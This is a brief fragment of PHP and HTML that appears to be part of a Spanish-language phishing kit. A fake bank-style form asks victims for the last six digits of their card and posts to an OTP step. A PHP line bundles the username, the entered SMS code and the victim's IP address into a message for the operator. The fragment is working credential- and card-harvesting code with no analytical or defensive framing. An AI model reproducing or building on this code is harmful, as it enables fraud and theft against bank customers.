...
$message = "User.: ".$usario." CodSMS.: ".$_POST['usuario']." ".$_SERVER['HTTP_X_FORWARDED_FOR']."\r\n";
	...
	<div class="container content text-center">
		<div class="row">
			<div class="col-md-4 col-md-offset-4 col-sm-6 col-sm-offset-3">
				<form class="reg-page" id="formLogin" method="post" action="otp4.php" enctype="multipart/form-data">
					...
					<div class="input-group margin-bottom-20 div_input" id="div_usuario">
						<label class="label_input">
							<input class="inputDatos" maxlength="6" minlength="6" name="usuario" id="inputUsuario" placeholder=" " onKeypress="if (event.keyCode < 45 || event.keyCode > 57) event.returnValue = false;" required="">
							<span class="span_input">Ultimos 6 digitos de tu tarjeta</span>
						</label>
					</div>
